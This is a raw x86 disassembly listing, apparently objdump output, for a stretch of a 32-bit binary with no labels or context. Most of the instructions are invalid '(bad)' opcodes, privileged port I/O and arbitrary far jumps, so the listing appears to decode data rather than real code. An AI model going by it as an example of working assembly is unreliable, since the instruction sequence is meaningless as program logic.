  409dbe:	mov    dh,0xd2
  409dc0:	aam    0xca
  409dc2:	stc    
  409dc3:	mov    ebp,0xbfdadeda
  409dc8:	sti    
  409dc9:	add    ah,bh
  409dcb:	(bad)  
  409dcc:	(bad)  
  409dcd:	fcmovnu st,st(5)
  409dcf:	add    ebp,eax
  409dd1:	call   0xb1d83ab
  409dd6:	mov    eax,0xf1c1c9cf
  409ddb:	in     eax,0xea
  409ddd:	cmc    
  409dde:	sti    
  409ddf:	rcl    edx,1
  409de1:	fidivr WORD PTR [edx-0xe0e4b09]
  409de7:	in     al,dx
  409de8:	in     al,dx
  409de9:	into   
  409dea:	add    esp,eax
  409dec:	ret    0xe2e9
  409def:	cmc    
  409df0:	test   DWORD PTR ds:0xe6e3fae9,0xc9e0f0bc
  409dfa:	cmc    
  409dfb:	scas   al,BYTE PTR es:[edi]
  409dfc:	mov    dh,0xb3
  409dfe:	jmp    0xda3f6af4
  409e03:	ror    dh,1
  409e05:	mov    edx,0x1b9d3f6
  409e0a:	cmc    
  409e0b:	cli    
  409e0c:	(bad)  
  409e0d:	jmp    0x7ce:0xfeb08e6
  409e14:	add    eax,DWORD PTR [edi+edi*4]
  409e17:	rcl    cl,cl
  409e19:	shr    DWORD PTR [ebp-0xd061611],0xd3
  409e20:	mov    ah,0xbe
  409e22:	out    dx,al
  409e23:	repnz fmulp st(5),st
  409e26:	idiv   ebp
  409e28:	mov    esp,0xd4d7dee0
  409e2d:	add    al,0xc4
  409e2f:	out    0xda,eax
  409e31:	stc    
  409e32:	add    BYTE PTR [ecx],al
  409e34:	add    eax,0xc6b8c8cf
  409e39:	jmp    0xea2c6900
  409e3e:	shl    dh,0xf3
  409e41:	cli    
  409e42:	enter  0xc8d9,0xd1
  409e46:	call   0xfa20a138
  409e4b:	add    eax,0x6ded5b9
  409e50:	sti    
  409e51:	retf   
  409e52:	cld    
  409e53:	enter  0x9f3,0xeb
  409e57:	mov    cl,0xed
  409e59:	in     al,0xd3
  409e5b:	in     eax,dx
  409e5c:	out    dx,eax
  409e5d:	shl    BYTE PTR [edx+edx*8-0x26280253],1
  409e64:	iret   
  409e65:	stc    
  409e66:	mov    ecx,0xbeb800bf
  409e6b:	stc    
  409e6c:	fcmovnu st,st(3)
  409e6e:	push   es
  409e6f:	loopne 0x409e4a
  409e71:	out    dx,al
  409e72:	out    0xe,eax
  409e74:	fmul   DWORD PTR [edi]
  409e76:	out    0xe9,al
  409e78:	out    dx,al
  409e79:	test   edx,0xb5cfd7b1
  409e7f:	mov    bh,0xd1
  409e81:	(bad)  
  409e82:	cli    
  409e83:	mov    esp,0x2fdf9d6
  409e88:	out    dx,al
  409e89:	in     eax,dx
  409e8a:	(bad)  
  409e8b:	inc    DWORD PTR [ecx]
  409e8d:	ror    dl,cl
  409e8f:	jmp    0x409e76
  409e91:	loop   0x409e95
  409e93:	(bad)  
  409e95:	f2xm1  
  409e97:	enter  0xdebc,0xcb
  409e9b:	sti    
  409e9c:	(bad)  
  409e9d:	lods   al,BYTE PTR ds:[esi]
  409e9e:	mov    ecx,0xf5cdb8d5
  409ea3:	int    0xf2
  409ea5:	xlat   BYTE PTR ds:[ebx]
  409ea6:	clc    
  409ea7:	fcmovnb st,st(3)
  409ea9:	ret    0xf8c5
  409eac:	retf   
  409ead:	aam    0xff
  409eaf:	jmp    0xccf:0xe0adffc
  409eb6:	stos   DWORD PTR es:[edi],eax
  409eb7:	retf   0xcede
  409eba:	in     al,0xb0
  409ebc:	mov    al,0xd1
  409ebe:	(bad)  
  409ec0:	icebp  
  409ec1:	leave  
  409ec2:	mov    ebp,0xefb0faec
  409ec7:	mov    ebp,0xfcfddc00
  409ecc:	clc    
  409ecd:	aam    0xe8
  409ecf:	loop   0x409eb4
  409ed1:	aam    0xe8
  409ed3:	adc    ecx,DWORD PTR [ebx]
  409ed5:	(bad)  
  409ed7:	(bad)  
  409ed8:	out    dx,al
  409ed9:	call   0xb703709f
  409ede:	loope  0x409ecc
  409ee0:	mov    bh,0xf8
  409ee2:	(bad)  
  409ee3:	retf   
  409ee4:	retf   
  409ee5:	into   
  409ee6:	hlt    
  409ee7:	in     eax,dx
  409ee8:	add    ah,bh
  409eea:	in     al,dx
  409eeb:	cli    
  409eec:	ror    DWORD PTR [ebx],cl
  409eee:	aam    0xfd
  409ef0:	out    0xd8,eax
  409ef2:	cld    
  409ef3:	add    bh,ch
  409ef5:	adc    ebx,eax
  409ef7:	ret    0xbeb3
  409efa:	sar    DWORD PTR [ecx+eiz*8-0x32334c40],cl
  409f01:	mov    edx,0xfdf9ccf2
  409f06:	jecxz  0x409f00
  409f08:	in     al,dx
  409f09:	sti    
  409f0a:	loopne 0x409ef8
  409f0c:	aad    0xf5
  409f0e:	fadd   st(0),st
  409f10:	fdivp  st(1),st
  409f12:	clc    
  409f13:	add    eax,0xc4c9d3fa
  409f18:	test   eax,0xf6b6edb0
  409f1d:	hlt    
  409f1e:	retf   0xc8d5
  409f21:	hlt    
  409f22:	(bad)  
  409f24:	mov    esi,0xd8d2bcf1
  409f29:	mov    esp,0xfecbf505
  409f2e:	sti    
  409f2f:	add    al,0xe3
  409f31:	out    dx,al
  409f32:	(bad)  
  409f34:	fcmovne st,st(2)
  409f36:	retf   0xe0dc
  409f39:	mov    bl,0xd6
  409f3b:	mov    cl,0xe3
  409f3d:	loop   0x409ef9
  409f3f:	jmp    0xeafb:0xffc8bff4
  409f46:	mov    esp,0xcdf6c1e1
  409f4b:	(bad)  
  409f4c:	inc    BYTE PTR [eax]
  409f4e:	icebp  
  409f4f:	retf   
  409f50:	(bad)  
  409f53:	lds    eax,FWORD PTR [eax]
  409f55:	in     al,0xec
  409f57:	(bad)
  409f5a:	mov    cl,0xd4
  409f5c:	jmp    0xd6f9:0xb7d8f8eb
  409f63:	mov    edi,0xc2d1c3c3
  409f68:	int    0xd0
  409f6a:	fcomp  st(0)
  409f6c:	repnz rol DWORD PTR ds:0xdff800f5,1
  409f73:	fcomi  st,st(3)
  409f75:	adc    esi,ebx
  409f77:	ror    bl,1
  409f79:	in     eax,0xee
  409f7b:	fsubr  st(7),st
  409f7d:	(bad)  
  409f7f:	mov    eax,0xbcf3d4e4
  409f84:	aad    0xdc
  409f86:	stc    
  409f87:	ror    esp,0xfb
  409f8a:	clc    
  409f8b:	repz ret 
  409f8d:	fucom  st(1)
  409f8f:	or     esp,edx
  409f91:	fprem  
  409f93:	(bad)
  409f96:	mov    esi,0xe0e9e0ad
  409f9b:	into   
  409f9c:	cli    
  409f9d:	mov    ch,0xe6
  409f9f:	mov    ah,0xb7
  409fa1:	rcl    edi,1
  409fa3:	jmp    0xc7b5:0xbee2d4eb
  409faa:	shl    ebp,1
  409fac:	jmp    0x409f8d
  409fae:	ret    0xefeb
  409fb1:	or     al,bh
  409fb3:	enter  0xd8dc,0xaf
  409fb7:	mov    ebp,0xb3cbe9a5
  409fbc:	(bad)  
  409fbd:	(bad)  
  409fbe:	loopne 0x409f85
  409fc0:	call   0xf8447d9f
  409fc5:	lock mov edx,0xbbe2f8e0
  409fcb:	jmp    0x409f89
  409fcd:	add    DWORD PTR ds:0xc3dbfeea,eax
  409fd3:	out    dx,eax
  409fd4:	fimul  DWORD PTR [esi]
  409fd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fd7:	shr    BYTE PTR [eax-0x240c3319],1
  409fdd:	mov    bh,0xb1
  409fdf:	in     eax,0xff
  409fe1:	idiv   edx
  409fe3:	(bad)  
  409fe4:	leave  
  409fe5:	clc    
  409fe6:	jecxz  0x409f9e
  409fe8:	(bad)  
  409fe9:	mov    edi,0xf8d1f307
  409fee:	ffreep st(5)
  409ff0:	out    dx,al
  409ff1:	add    eax,0x901ced4
  409ff6:	in     al,dx
  409ff7:	jmp    0xd2d0:0xecb0c8ce
  409ffe:	rcr    edi,cl
  40a000:	out    0xb6,eax
  40a002:	repz (bad) 
  40a004:	mov    cl,0x1
  40a006:	sar    DWORD PTR [esi+0x7bff0cf],cl
  40a00c:	mov    ecx,0xe05f4db
  40a011:	jecxz  0x40a008
  40a013:	fcmove st,st(5)
  40a015:	(bad)  
  40a016:	in     eax,dx
  40a017:	in     al,0xa5
  40a019:	jmp    0xd73c6402
  40a01e:	in     eax,0xd9
  40a020:	mov    edi,0xd6ddfce9
  40a025:	repnz mov ebp,0x1d7c0cc
  40a02b:	mov    esi,0xfbe706d2
  40a030:	push   es
  40a031:	add    al,bh
  40a033:	push   es
  40a034:	adc    ecx,DWORD PTR [edx]
  40a036:	ret    0xdfc4
  40a039:	jmp    0x409ff2
  40a03b:	in     eax,0xc2
  40a03d:	rcl    bl,cl
  40a03f:	mov    dl,0xf0
  40a041:	clc    
  40a042:	stc    
  40a043:	int    0xf2
  40a045:	mov    edx,0xf9e3d6f4
  40a04a:	cmc    
  40a04b:	add    eax,DWORD PTR [ebx]
  40a04d:	fcomp  st(4)
  40a04f:	cld    
  40a050:	in     al,0xf4
  40a052:	out    0xe5,eax
  40a054:	out    0xe1,al
  40a056:	test   eax,0xd2c9b1c4
  40a05b:	iret   
  40a05c:	jmp    0xc9d3:0xb9f1b4a8
  40a063:	in     al,dx
  40a064:	fdivr  DWORD PTR [ebp-0x140123d]
  40a06a:	rcl    dh,0xdf
  40a06d:	fmul   QWORD PTR [edx]
  40a06f:	push   es
  40a070:	fucomp st(2)
  40a072:	mov    DWORD PTR [edx],0xe3efefe6
  40a078:	repnz lods eax,DWORD PTR ds:[esi]
  40a07a:	int3   
  40a07b:	loop   0x40a026
  40a07d:	call   0xdc378a6c
  40a082:	call   ebx
  40a084:	fstp   st(1)
  40a086:	mov    esi,0xc5bdbfee
  40a08b:	mov    edx,0xcbd104f6
  40a090:	fcmovnu st,st(4)
  40a092:	fimul  WORD PTR [edx]
  40a094:	loop   0x40a089
  40a096:	loop   0x40a080
  40a098:	loopne 0x40a071
  40a09a:	retf   0xb0f7
  40a09d:	aad    0xe7
  40a09f:	cli    
  40a0a0:	into   
  40a0a1:	in     eax,0xfa
  40a0a3:	hlt    
  40a0a4:	(bad)  
  40a0a6:	not    al
  40a0a8:	cld    
  40a0a9:	loope  0x40a0a2
  40a0ab:	aam    0xf3
  40a0ad:	sar    BYTE PTR [edi-0x342b1c1c],1
  40a0b3:	dec    ecx
  40a0b5:	clc    
  40a0b6:	repz mov esp,0xeccfc0ed
  40a0bc:	mov    ah,0xba
  40a0be:	mov    dh,0xb6
  40a0c0:	int    0xe4
  40a0c2:	in     eax,0xbe
  40a0c4:	(bad)  
  40a0c6:	mov    esp,0xd3e7c3cf
  40a0cb:	add    eax,0xf606e0f5
  40a0d0:	(bad)  
  40a0d1:	shr    ah,0xfc
  40a0d4:	add    al,BYTE PTR [edx+ecx*8]
  40a0d7:	repz int3 
  40a0d9:	repnz in al,dx
  40a0db:	call   0xb80552cc
  40a0e0:	enter  0xfad2,0xcb
  40a0e4:	mov    ebx,0xbfeddab0
  40a0e9:	mov    eax,0xc1dfbad0
  40a0ee:	(bad)
  40a0f1:	fisttp WORD PTR [ebx]
  40a0f3:	int    0xde
  40a0f5:	in     al,dx
  40a0f6:	stos   DWORD PTR es:[edi],eax
  40a0f7:	iret   
  40a0f8:	lods   al,BYTE PTR ds:[esi]
  40a0f9:	out    dx,eax
  40a0fa:	jmp    0xe8ee:0xd1c4e0ea
  40a101:	shl    ch,1
  40a103:	iret   
  40a104:	int    0xea
  40a106:	cmc    
  40a107:	mov    edi,0xfdfcdbbe
  40a10c:	in     al,0xd6
  40a10e:	rol    edi,1
  40a110:	fucomp st(2)
  40a112:	aam    0xc9
  40a114:	dec    edx
  40a116:	mov    esp,0xf6e8a9b3
  40a11b:	in     al,0xe7
  40a11d:	(bad)  
  40a11e:	scas   eax,DWORD PTR es:[edi]
  40a11f:	retf   0xdfff
  40a122:	fcmovu st,st(3)
  40a124:	call   0xd64180e8
  40a129:	push   es
  40a12a:	repz cmc 
  40a12c:	mov    esp,0xe50fd0e6
  40a131:	cmc    
  40a132:	add    eax,0xa8ddc9e6
  40a137:	test   eax,0xb1c8b2de
  40a13c:	aam    0xce
  40a13e:	les    edi,FWORD PTR [edx-0x33460711]
  40a144:	iret   
  40a145:	ret    
  40a146:	loopne 0x40a11e
  40a148:	in     al,dx
  40a149:	add    eax,0x1d9dbcd
  40a14e:	sti    
  40a14f:	loope  0x40a131
  40a151:	(bad)  
  40a153:	retf   0x3e7
  40a156:	repnz lock icebp 
  40a159:	out    0xf0,eax
  40a15b:	cmc    
  40a15c:	mov    bh,0xca
  40a15e:	icebp  
  40a15f:	call   0xb2f9603f
  40a164:	fst    st(7)
  40a166:	(bad)  
  40a167:	loopne 0x40a148
  40a169:	into   
  40a16a:	fdiv   st,st(3)
  40a16c:	or     al,bh
  40a16e:	stc    
  40a16f:	in     al,0xc6
  40a171:	add    DWORD PTR [esi],eax
  40a173:	repz stc 
  40a175:	or     BYTE PTR [esi-0x2b114215],bh
  40a17b:	ret    0xccb5
  40a17e:	int3   
  40a17f:	(bad)  
  40a180:	mov    ecx,0xd1e4b3d1
  40a185:	cmc    
  40a186:	mov    eax,0xcddcf3be
  40a18b:	lock or al,BYTE PTR [ecx]
  40a18e:	pop    es
  40a18f:	add    ebx,esi
  40a191:	(bad)  
  40a192:	in     eax,0xe5
  40a194:	fndisi(8087 only) 
  40a196:	(bad)  
  40a198:	mov    esi,0xe7c3f5c6
  40a19d:	rcl    al,0xc8
  40a1a0:	out    dx,al
  40a1a1:	repz repz clc 
  40a1a4:	int3   
  40a1a5:	add    dh,cl
  40a1a7:	rcl    dl,cl
  40a1a9:	mov    ah,0xf2
  40a1ab:	(bad)  
  40a1ac:	not    edi
  40a1ae:	ret    
  40a1af:	retf   
  40a1b0:	neg    dh
  40a1b2:	pop    es
  40a1b3:	enter  0xddff,0xbc
  40a1b7:	retf   
  40a1b8:	lods   al,BYTE PTR ds:[esi]
  40a1b9:	lock stos DWORD PTR es:[edi],eax
  40a1bb:	rcr    bl,1
  40a1bd:	mul    eax
  40a1bf:	into   
  40a1c0:	out    dx,eax
  40a1c1:	out    dx,eax
  40a1c2:	aam    0xca
  40a1c4:	int3   
  40a1c5:	mov    al,0xc2
  40a1c7:	fucom  st(2)
  40a1c9:	repz call edx
  40a1cc:	repnz clc 
  40a1ce:	icebp  
  40a1cf:	ffree  st(1)
  40a1d1:	push   es
  40a1d2:	retf   0x7db
  40a1d5:	add    al,al
  40a1d7:	rol    ah,1
  40a1d9:	lods   al,BYTE PTR ds:[esi]
  40a1da:	out    dx,eax
  40a1db:	iret   
  40a1dc:	not    esp
  40a1de:	fsqrt  
  40a1e0:	fdivp  st(6),st
  40a1e2:	(bad)  
  40a1e4:	jmp    0xdac2:0xd9d4fff9
  40a1eb:	add    esi,ecx
  40a1ed:	(bad)
  40a1f0:	shl    ebx,0xc7
  40a1f3:	or     bh,cl
  40a1f5:	fsub   st(0),st
  40a1f7:	repnz in al,dx
  40a1f9:	aad    0xf3
  40a1fb:	iret   
  40a1fc:	jecxz  0x40a1b9
  40a1fe:	mov    bh,0xcd
  40a200:	stc    
  40a201:	lock fcmovu st,st(5)
  40a204:	mov    ebx,0xbdefd4f2
  40a209:	add    edx,eax
  40a20b:	repz rol DWORD PTR [edi],cl
  40a20e:	out    0xf7,eax
  40a210:	fidivr DWORD PTR [esi+eiz*8-0x3df41032]
  40a217:	enter  0xbdc6,0xe5
  40a21b:	(bad)  
  40a21c:	jmp    0xd21598fa
  40a221:	clc    
  40a222:	enter  0xbaff,0xbb
  40a226:	ret    
  40a227:	add    al,al
  40a229:	mov    eax,0xe2f9d3d2
  40a22e:	rcl    edi,1
  40a230:	out    0xf6,eax
  40a232:	out    dx,al
  40a233:	jmp    0xbf2f8614
  40a238:	into   
  40a239:	fdivr  st(4),st
  40a23b:	mov    ah,0xfb
  40a23d:	(bad)  
  40a23f:	stc    
  40a240:	idiv   BYTE PTR [eax-0x29270f08]
  40a246:	icebp  
  40a247:	(bad)  
  40a249:	cmc    
  40a24a:	(bad)  
  40a24b:	div    dl
  40a24d:	add    ebx,esp
  40a24f:	in     eax,0xea
  40a251:	loope  0x40a23b
  40a253:	jmp    0x40a255
  40a255:	jecxz  0x40a226
  40a257:	test   al,0xc4
  40a259:	div    DWORD PTR [esi-0x503a0917]
  40a25f:	aam    0xd1
  40a261:	repz rcr bl,1
  40a264:	mov    ch,0xfa
  40a266:	mov    edi,0xe7e3dbfa
  40a26b:	add    dl,bl
  40a26d:	fldl2t 
  40a26f:	out    0xca,al
  40a271:	aam    0xcd
  40a273:	std    
  40a274:	loope  0x40a236
  40a276:	rol    cl,cl
  40a278:	in     eax,0xb7
  40a27a:	int3   
  40a27b:	call   0xdaf57966
  40a280:	cli    
  40a281:	mov    ebx,0xb9f2b5ea
  40a286:	hlt    
  40a287:	add    bh,bh
  40a289:	ffreep st(5)
  40a28b:	push   es
  40a28c:	mov    ecx,0xfddefe09
  40a291:	fld    QWORD PTR [ecx]
  40a293:	in     eax,0x6
  40a295:	enter  0xcceb,0xc8
  40a299:	shl    DWORD PTR [edi-0x11100805],cl
  40a29f:	(bad)  
  40a2a0:	iret   
  40a2a1:	fcmovu st,st(6)
  40a2a3:	retf   0xe3ce
  40a2a6:	jmp    0xfd167c6e
  40a2ab:	add    al,0xc7
  40a2ad:	jmp    0x40a2b9
  40a2af:	add    DWORD PTR [ebx],eax
  40a2b1:	fdivrp st(4),st
  40a2b3:	or     eax,0xcca9e9ec
  40a2b8:	mov    esi,0xb1f6c4e3
  40a2bd:	fcmovbe st,st(4)
  40a2bf:	xlat   BYTE PTR ds:[ebx]
  40a2c0:	int    0xd9
  40a2c2:	in     al,0xcb
  40a2c4:	mov    esi,0xd0e3efd5
  40a2c9:	repnz not bl
  40a2cc:	ret    0xcac4
  40a2cf:	in     al,0xe4
  40a2d1:	mul    al
  40a2d3:	jmp    0x40a2d1
  40a2d5:	icebp  
  40a2d6:	mov    ebp,0xddb0cbd7
  40a2db:	mov    bl,0xf1
  40a2dd:	mov    ah,0xc8
  40a2df:	mov    eax,0xb8eff5bb
  40a2e4:	enter  0xddf5,0xc1
  40a2e8:	inc    dl
  40a2ea:	add    eax,0xde0afcdf
  40a2ef:	(bad)  
  40a2f0:	retf   0xddf9
  40a2f3:	add    ebx,ecx
  40a2f5:	loope  0x40a2e8
  40a2f7:	loop   0x40a2ec
  40a2f9:	lock ret 
  40a2fb:	lock (bad) 
  40a2fd:	in     eax,0xf6
  40a2ff:	div    DWORD PTR [esi-0x342a340b]
  40a305:	mov    edx,0xf8e2fb03
  40a30a:	aad    0xbd
  40a30c:	rcr    edx,1
  40a30e:	ret    
  40a30f:	clc    
  40a310:	in     al,0x8
  40a312:	or     ebp,ecx
  40a314:	or     dh,cl
  40a316:	mov    ecx,0xe2eddcdf
  40a31b:	mov    cl,0xf0
  40a31d:	repnz scas eax,DWORD PTR es:[edi]
  40a31f:	mov    dh,0xc6
  40a321:	(bad)  
  40a322:	test   dl,0xed
  40a325:	bnd jmp 0xe5f573eb
  40a32b:	fsincos 
  40a32d:	(bad)  
  40a32f:	out    dx,eax
  40a330:	jecxz  0x40a33b
  40a332:	(bad)  
  40a334:	add    eax,0xe6e4d10e
  40a339:	fst    st(0)
  40a33b:	shl    ecx,cl
  40a33d:	test   al,0xf8
  40a33f:	div    DWORD PTR [ecx-0xc29042e]
  40a345:	leave  
  40a346:	add    esp,edx
  40a348:	push   es
  40a349:	out    0xbb,al
  40a34b:	jmp    0x40a318
  40a34d:	ret    
  40a34e:	sti    
  40a34f:	aad    0xef
  40a351:	push   cs
  40a352:	(bad)  
  40a354:	adc    ebp,eax
  40a356:	loop   0x40a339
  40a358:	test   eax,0xe6aaedc8
  40a35d:	jmp    0xad208b42
  40a362:	fiadd  WORD PTR [ebx]
  40a364:	fsub   st,st(3)
  40a366:	rol    dl,cl
  40a368:	rcr    ecx,0xd5
  40a36b:	fiadd  WORD PTR [eax]
  40a36d:	loopne 0x40a332
  40a36f:	add    eax,DWORD PTR [eax]
  40a371:	or     BYTE PTR [eax+ecx*1],cl
  40a374:	add    ebx,edi
  40a376:	lods   eax,DWORD PTR ds:[esi]
  40a377:	ret    0xeab7
  40a37a:	xlat   BYTE PTR ds:[ebx]
  40a37b:	int3   
  40a37c:	ret    
  40a37d:	icebp  
  40a37e:	shl    bl,1
  40a380:	stc    
  40a381:	clc    
  40a382:	int    0xd2
  40a384:	int    0xb8
  40a386:	mov    bh,0xe1
  40a388:	mov    ch,0xfe
  40a38a:	rcr    bh,1
  40a38c:	add    esp,esi
  40a38e:	add    al,0xde
  40a390:	rcr    ah,0xdb
  40a393:	or     bl,bh
  40a395:	loope  0x40a348
  40a397:	iret   
  40a398:	mov    esp,0xb4b7bce1
  40a39d:	cli    
  40a39e:	rol    esi,0xba
  40a3a1:	std    
  40a3a2:	mov    esi,0xf9d5dff3
  40a3a7:	stc    
  40a3a8:	stc    
  40a3a9:	jmp    edi
  40a3ab:	push   es
  40a3ac:	sti    
  40a3ad:	les    eax,FWORD PTR ds:0xdaf6e8f7
  40a3b3:	add    eax,0xa8cbd2e4
  40a3b8:	div    esi
  40a3ba:	(bad)  [esi-0x5173f2d]
  40a3c0:	(bad)  
  40a3c2:	jmp    0x40a39a
  40a3c4:	icebp  
  40a3c5:	fild   WORD PTR [eax]
  40a3c7:	icebp  
  40a3c8:	shl    esi,cl
  40a3ca:	out    0xf8,al
  40a3cc:	hlt    
  40a3cd:	add    dh,dh
  40a3cf:	hlt    
  40a3d0:	rol    DWORD PTR [edx],0xe6
  40a3d3:	enter  0xebeb,0xc1
  40a3d7:	sar    DWORD PTR [ebp-0x311e0d37],0xfa
  40a3de:	fcmovb st,st(4)
  40a3e0:	mov    edi,0xd7dff9d0
  40a3e5:	cld    
  40a3e6:	repnz (bad) 
  40a3e8:	loopne 0x40a3e0
  40a3ea:	push   esp
  40a3ec:	add    eax,eax
  40a3ee:	ret    
  40a3ef:	clc    
  40a3f0:	in     al,0xd
  40a3f2:	inc    BYTE PTR [eax]
  40a3f4:	in     eax,0xcd
  40a3f6:	loop   0x40a3c1
  40a3f8:	loope  0x40a3a9
  40a3fa:	(bad)  
  40a3fb:	hlt    
  40a3fc:	repz jmp 0xbbfe:0xf8d5cbeb
  40a404:	mov    ch,0xd8
  40a406:	(bad)  
  40a407:	cld    
  40a408:	clc    
  40a409:	add    al,BYTE PTR ds:0xf4e3fce0
  40a40f:	(bad)  
  40a410:	loopne 0x40a413
  40a412:	out    0xda,eax
  40a414:	or     ebp,edi
  40a416:	icebp  
  40a417:	(bad)
  40a41a:	lods   al,BYTE PTR ds:[esi]
  40a41b:	mov    al,0xf1
  40a41d:	leave  
  40a41e:	aad    0xd7
  40a420:	fdivr  st,st(7)
  40a422:	(bad)  
  40a423:	mov    dh,0xd0
  40a425:	ret    0xf0dc
  40a428:	out    0xf1,eax
  40a42a:	loopne 0x40a421
  40a42c:	rol    DWORD PTR ds:0xdc09c909,0x8
  40a433:	loop   0x40a432
  40a435:	sar    BYTE PTR [esi-0x2c0c1134],0xdb
  40a43c:	shr    edx,cl
  40a43e:	scas   eax,DWORD PTR es:[edi]
  40a43f:	leave  
  40a440:	leave  
  40a441:	mov    edi,0xe3d5d3cb
  40a446:	clc    
  40a447:	std    
  40a448:	in     al,dx
  40a449:	fmulp  st(4),st
  40a44b:	in     eax,0xf6
  40a44d:	fstp   TBYTE PTR [edi-0x7213a03]
  40a453:	in     eax,dx
  40a454:	cli    
  40a455:	add    ecx,esp
  40a457:	shl    esi,0xc7
  40a45a:	enter  0xeaf2,0xfa
  40a45e:	jmp    0xb5db:0xdaacbbf8
  40a465:	int3   
  40a466:	fadd   QWORD PTR [edi]
  40a468:	mov    edi,0xc0bc02d7
  40a46d:	div    esi
  40a46f:	retf   
  40a470:	xlat   BYTE PTR ds:[ebx]
  40a471:	fadd   QWORD PTR [ecx+ecx*8]
  40a474:	repnz out 0xbe,eax
  40a477:	lods   eax,DWORD PTR ds:[esi]
  40a478:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a479:	fdivrp st(0),st
  40a47b:	int    0xc3
  40a47d:	loope  0x40a431
  40a47f:	in     al,0xc9
  40a481:	(bad)  
  40a482:	cld    
  40a483:	(bad)  
  40a484:	(bad)  
  40a486:	mov    ecx,0x2f303fc
  40a48b:	out    0xda,al
  40a48d:	ret    
  40a48e:	(bad)  
  40a48f:	in     al,0xe2
  40a491:	fcmovnb st,st(5)
  40a493:	fcomi  st,st(2)
  40a495:	push   es
  40a496:	repnz (bad) 
  40a498:	into   
  40a499:	out    0xe9,eax
  40a49b:	(bad)  [edx+esi*4-0x1173305]
  40a4a2:	mul    ah
  40a4a4:	mov    eax,0xd0f2e3fe
  40a4a9:	icebp  
  40a4aa:	fabs   
  40a4ac:	or     bh,BYTE PTR [eax-0x25141dfd]
  40a4b2:	push   cs
  40a4b3:	or     eax,0xd1f109fd
  40a4b8:	(bad)  
  40a4b9:	test   al,0xc2
  40a4bb:	hlt    
  40a4bc:	jmp    0xe8b5:0xb4d8d7b0
  40a4c3:	fdivr  QWORD PTR [ebp+edi*8-0x3e402e02]
  40a4ca:	mov    ebp,0xe00603c2
  40a4cf:	(bad)  
  40a4d1:	or     edi,ebp
  40a4d3:	sti    
  40a4d4:	or     eax,0xbde7d1c0
  40a4d9:	icebp  
  40a4da:	aam    0xee
  40a4dc:	(bad)
  40a4df:	mov    ebx,0xb5fbd6ad
  40a4e4:	rcl    ecx,cl
  40a4e6:	mov    ebx,0x1e2cef0
  40a4eb:	in     al,dx
  40a4ec:	rcr    esp,1
  40a4ee:	out    0xc7,eax
  40a4f0:	(bad)  
  40a4f2:	in     eax,dx
  40a4f3:	or     eax,0xbfc4fec4
  40a4f8:	fucom  st(3)
  40a4fa:	lock cmc 
  40a4fc:	aam    0xd2
  40a4fe:	aad    0xf9
  40a500:	jmp    0x40a4dd
  40a502:	clc    
  40a503:	mov    ebp,0xf5d1dbd0
  40a508:	ret    0x400
  40a50b:	cld    
  40a50c:	lock (bad) 
  40a50e:	aad    0xf9
  40a510:	mov    ebp,0xf9f30e05
  40a515:	out    0xb9,al
  40a517:	ret    0xc6ac
  40a51a:	out    dx,al
  40a51b:	cmc    
  40a51c:	cmc    
  40a51d:	int3   
  40a51e:	out    dx,al
  40a51f:	(bad)  
  40a521:	(bad)  
  40a522:	(bad)  
  40a523:	rcr    esi,1
  40a525:	mov    esi,0x1d200f5
  40a52a:	rol    BYTE PTR [ebx],cl
  40a52c:	ret    
  40a52d:	(bad)  
  40a52e:	jmp    0x40a535
  40a530:	hlt    
  40a531:	iret   
  40a532:	or     eax,0xb3c012ee
  40a537:	in     al,dx
  40a538:	out    dx,al
  40a539:	in     eax,0xe7
  40a53b:	jmp    0x40a503
  40a53d:	lock stc 
  40a53f:	in     al,0xe6
  40a541:	(bad)  
  40a542:	(bad)  
  40a543:	mov    dl,0xd8
  40a545:	ret    0xffcd
  40a548:	int3   
  40a549:	mov    ah,0xe1
  40a54b:	repz ret 0xd5d6
  40a54f:	imul   edx
  40a551:	sti    
  40a552:	fimul  WORD PTR [edi]
  40a554:	retf   
  40a555:	(bad)  
  40a556:	in     eax,dx
  40a557:	leave  
  40a558:	fst    st(6)
  40a55a:	iret   
  40a55b:	mov    bh,0xc4
  40a55d:	in     al,0xe5
  40a55f:	in     eax,dx
  40a560:	(bad)  
  40a561:	les    edi,FWORD PTR [edi-0x5010c45]
  40a567:	add    edx,ebx
  40a569:	cmc    
  40a56a:	(bad)  
  40a56c:	mov    dh,0xd8
  40a56f:	call   0x1347a83c
  40a574:	add    ah,bl
  40a576:	stos   DWORD PTR es:[edi],eax
  40a577:	ret    
  40a578:	neg    dh
  40a57a:	enter  0xc0d2,0xc9
  40a57e:	cmc    
  40a57f:	shl    edx,1
  40a581:	in     eax,dx
  40a582:	mov    eax,0xf3becebe
  40a587:	xlat   BYTE PTR ds:[ebx]
  40a588:	rcr    ah,cl
  40a58a:	cld    
  40a58b:	(bad)  
  40a58c:	stc    
  40a58d:	add    al,0xde
  40a58f:	or     cl,BYTE PTR [ebx]
  40a591:	into   
  40a592:	fild   WORD PTR [edi]
  40a594:	jmp    0x40a5a4
  40a596:	iret   
  40a597:	out    dx,al
  40a598:	mov    edi,0xb1eec9c0
  40a59d:	jmp    0xcd145f6b
  40a5a2:	in     eax,dx
  40a5a3:	retf   0xd5ec
  40a5a6:	fnstcw WORD PTR [edx-0x1f181e11]
  40a5ac:	stc    
  40a5ad:	fld    DWORD PTR [ebx]
  40a5af:	(bad)  
  40a5b0:	(bad)  
  40a5b2:	call   0xef40aa99
  40a5b7:	loope  0x40a5a9
  40a5b9:	into   
  40a5ba:	lods   eax,DWORD PTR ds:[esi]
  40a5bb:	fsubr  st(4),st
  40a5bd:	div    edi
  40a5bf:	fistp  QWORD PTR [edx-0x4b2f0e09]
  40a5c5:	mov    ebx,0xceecdac2
  40a5ca:	fcomp  st(3)
  40a5cc:	mov    esp,0xefe70600
  40a5d1:	std    
  40a5d2:	add    al,0xd
  40a5d4:	or     ah,bl
  40a5d6:	fnstenv [ebx-0x11170938]
  40a5dc:	lods   al,BYTE PTR ds:[esi]
  40a5dd:	into   
  40a5de:	loopne 0x40a598
  40a5e0:	(bad)  
  40a5e1:	in     al,0xe5
  40a5e3:	div    edi
  40a5e5:	repnz fcom st(6)
  40a5e8:	fadd   DWORD PTR ds:0xf9fc02fe
  40a5ee:	jecxz  0x40a5c9
  40a5f0:	cli    
  40a5f1:	out    0xcf,eax
  40a5f3:	jmp    0xc9c1:0xc0d8050f
  40a5fa:	(bad)  
  40a5fb:	jecxz  0x40a5c8
  40a5fd:	mov    ah,0xc7
  40a5ff:	enter  0xb0e5,0xfc
